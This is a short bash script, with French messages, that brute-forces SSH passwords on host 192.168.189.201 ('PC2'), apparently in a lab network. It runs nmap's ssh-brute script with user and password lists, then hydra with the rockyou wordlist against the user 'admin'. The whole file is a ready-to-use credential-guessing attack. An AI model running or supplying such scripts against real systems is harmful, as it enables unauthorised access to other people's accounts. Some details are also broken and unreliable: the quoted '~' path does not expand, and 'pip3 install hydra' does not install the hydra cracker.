#!/bin/bash

echo "=== SSH Brute Force Attack ==="
echo "Objectif: Trouver le mot de passe SSH de PC2"

CIBLE_IP="192.168.189.201"
UTILISATEUR="admin"
RESULTS_DIR="~/attacks/ssh_bruteforce"

echo "=== Methode 1: nmap brute scripts ==="
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt $CIBLE_IP -oN $RESULTS_DIR/scan_nmap.txt

echo "=== Methode 2: hydra (si installe) ==="
if which hydra >/dev/null 2>&1; then
    hydra -l $UTILISATEUR -P /usr/share/wordlists/rockyou.txt $CIBLE_IP ssh -V -o $RESULTS_DIR/resultat_hydra.txt
else
    echo "hydra non installe. Utiliser: sudo dnf install python3-pip && pip3 install hydra"
fi

echo ""
echo "Resultats sauvegardes dans $RESULTS_DIR/"
